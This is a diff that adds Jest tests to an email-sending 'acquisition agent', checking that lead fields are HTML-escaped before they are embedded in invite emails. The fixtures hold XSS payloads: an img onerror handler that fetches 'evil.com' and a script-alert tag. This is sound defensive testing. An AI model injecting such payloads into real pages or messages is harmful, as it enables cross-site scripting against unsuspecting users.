@@ -182,3 +182,42 @@ describe("acquisition agent — outbound copy compliance", () => {
     expect(body).not.toMatch(/a review/i);
   });
 });
+
+describe("acquisition agent — HTML injection in invite email", () => {
+  it("escapes a malicious businessName before embedding it in the HTML body", async () => {
+    LEADS = [
+      {
+        ...hotLead(0),
+        business_name: '<img src=x onerror=fetch("evil.com")>',
+        city: null,
+      },
+    ];
+
+    await run(true, 5);
+
+    expect(QUEUED).toHaveLength(1);
+    const html: string = (QUEUED[0] as { html: string }).html;
+    // The raw angle-bracket form must not appear in the HTML output.
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("<script");
+    // The escaped form must be present — confirms the name was included but safely.
+    expect(html).toContain("&lt;img");
+  });
+
+  it("escapes a malicious city value before embedding it in the HTML body", async () => {
+    LEADS = [
+      {
+        ...hotLead(0),
+        business_name: "Drip Lab",
+        city: '<script>alert("xss")</script>',
+      },
+    ];
+
+    await run(true, 5);
+
+    expect(QUEUED).toHaveLength(1);
+    const html: string = (QUEUED[0] as { html: string }).html;
+    expect(html).not.toContain("<script");
+    expect(html).toContain("&lt;script&gt;");
+  });
+});
